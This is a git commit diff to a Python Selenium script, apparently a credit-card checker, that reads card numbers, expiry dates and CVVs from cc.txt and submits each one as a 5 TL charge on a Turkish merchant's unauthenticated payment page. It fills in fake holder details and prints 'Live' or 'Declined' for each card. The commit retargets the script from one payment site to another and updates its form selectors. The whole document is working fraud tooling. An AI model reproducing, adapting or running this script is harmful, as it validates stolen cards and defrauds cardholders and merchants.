665c336f60449f6005986488ed80246447317dab
Aligollez <59908197+aligollez@users.noreply.github.com>
2022-02-23 06:30:44 +0300

    Update tr_pos.py

--- tr_pos.py
+++ tr_pos.py
@@ -19,7 +19,7 @@ from time import sleep
 
 
 def funct():
-    CCList = open('cc.txt', "r+", encoding="utf8").read().splitlines()
+    CCList = open('cc.txt', "r+", encoding="utf8").read().splitlines()# hata werirse c:/user/ali/masaüstü/cc.txt gibi düzeltin
     kartlar = []
 
     for i in CCList:
@@ -41,8 +41,8 @@ options.add_experimental_option("excludeSwitches", ["enable-automation"])  # Exc
 options.add_argument("disable-popup-blocking")
 options.add_argument("disable-notifications")
 options.add_argument("disable-gpu")
-#options.add_argument("user-data-dir=/home/kali/Masaüstü/DMN/")
-#driver = webdriver.Chrome(executable_path="/home/kali/Masaüstü/DMN/chromedriver",options=options)
+#options.add_argument("user-data-dir=/home/kali/Masaüstü/Card-Tweaker-main/")
+#driver = webdriver.Chrome(executable_path="/home/kali/Masaüstü/Card-Tweaker-main/chromedriver",options=options)
 chromedriver_autoinstaller.install()
 driver = webdriver.Chrome(options=options)
 driver.set_window_size(230, 550)
@@ -53,7 +53,7 @@ driver.delete_all_cookies()
 
 init(autoreset=True)
 while True:
-        buy = ("https://odeme.orthero.com.tr/Payment/UnAuthenticatedPayment?notAut=True")
+        buy = ("https://odeme.windoform.com.tr/Payment/Step1?notAut=True")
         print('Starting ..')
         driver.get(buy)
         sleep(2)
@@ -67,14 +67,20 @@ while True:
          wait.until(EC.presence_of_element_located((By.ID, 'PureAmount'))).click()
          sleep(1)
          wait.until(EC.presence_of_element_located((By.ID, 'PureAmount'))).send_keys('5')
-         wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="installmentTable"]/table[1]/tbody/tr[2]/td[4]/input'))).click()
+         wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="installmentTable"]/table[1]/tbody/tr[2]/td[2]/div[3]'))).click()
+         wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="installmentTable"]/table[1]/tbody/tr[2]/td[2]/div[3]'))).click()
+         #wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '#installmentTable > table > tbody > tr:nth-child(2) > td.commRate-20.best-commrate.highlight > input'))).click()
          wait.until(EC.presence_of_element_located((By.ID, 'Phone'))).click()
          wait.until(EC.presence_of_element_located((By.ID, 'Phone'))).send_keys('545621589')
          wait.until(EC.presence_of_element_located((By.ID, 'CardHolderName'))).send_keys('selim kurrt')
          wait.until(EC.presence_of_element_located((By.ID, 'Email'))).send_keys('se54@nart.com')
-         wait.until(EC.presence_of_element_located((By.ID, 'TransactionDescription'))).send_keys('seggcom')
-         sleep(0.2)
-         wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="installmentTable"]/table[1]/tbody/tr[2]/td[4]/input'))).click()
+        # wait.until(EC.presence_of_element_located((By.ID, 'TransactionDescription'))).send_keys('seggcom')
+        # sleep(0.2)
+        # try:
+        #     wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '#installmentTable > table > tbody > tr:nth-child(2) > td.commRate-20.best-commrate.highlight > input'))).click()
+        #     print("pos secildi")
+        # except ValueError:
+        #     print("pos tiklanamadi")
          wait.until(EC.presence_of_element_located((By.ID, 'CardNumber'))).send_keys(o[0])
          wait.until(EC.presence_of_element_located((By.ID, 'CardNumber'))).send_keys(o[1])
          wait.until(EC.presence_of_element_located((By.ID, 'CardNumber'))).send_keys(o[2])
@@ -85,10 +91,10 @@ while True:
          wait.until(EC.presence_of_element_located((By.ID, 'CardCvv'))).send_keys(Keys.CONTROL + Keys.BACKSPACE)
          wait.until(EC.presence_of_element_located((By.ID, 'CardCvv'))).send_keys(cvv)
          wait.until(EC.presence_of_element_located((By.ID, 'btnNormalPayment'))).click()
-         sleep(3)
+         sleep(3.5)
  
          if 'Lütfen taksit seçeneklerinden birini seçiniz.' in driver.page_source:
-             wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="installmentTable"]/table[1]/tbody/tr[2]/td[4]/input'))).click()
+             wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="installmentTable"]/table[1]/tbody/tr[2]/td[2]/div[3]'))).click()
              print(Fore.GREEN +'5.00 TL WORLD POS SECİLDİ')
              wait.until(EC.presence_of_element_located((By.ID, 'btnNormalPayment'))).click()
              sleep(2)
@@ -99,14 +105,17 @@ while True:
              print(Fore.GREEN + "                                            ")
              print(Fore.GREEN + "                                            ")
              print(Fore.GREEN + driver.find_element(By.XPATH, "//*[@id='myForm']/div[2]/div/div[1]/p").text)
+             print(Fore.GREEN + "                                            ")
              print(Fore.GREEN + "Live: " , cc,"|",mm,"|",yy,"|",cvv,)
+             print(Fore.GREEN + "                                            ")
+             print(Fore.GREEN + "                                            ")
              print(Fore.GREEN +"Yes - No ")
              choice = input(Fore.RED +"Devam ?" )
              if choice == 'y':
                  print(Fore.GREEN +"devam ediyor .")
                  sleep(0.2)
                  print(Fore.GREEN +"devam ediyor ..")
-                 driver.get("https://odeme.orthero.com.tr/Payment/UnAuthenticatedPayment?notAut=True")
+                 driver.get("https://odeme.windoform.com.tr/Payment/Step1?notAut=True")
                  sleep(2)
              else:
                  print(Fore.GREEN + "                                 ")
@@ -120,6 +129,6 @@ while True:
              sleep(2)
          else:
              print(Fore.RED +"Declined :Ödeme Yapılamadı.", cc,"|",mm,"|",yy,"|",cvv,)     
-             driver.get("https://odeme.orthero.com.tr/Payment/UnAuthenticatedPayment?notAut=True")
+             driver.get("https://odeme.windoform.com.tr/Payment/Step1?notAut=True")
              sleep(3)
          sleep(3)    
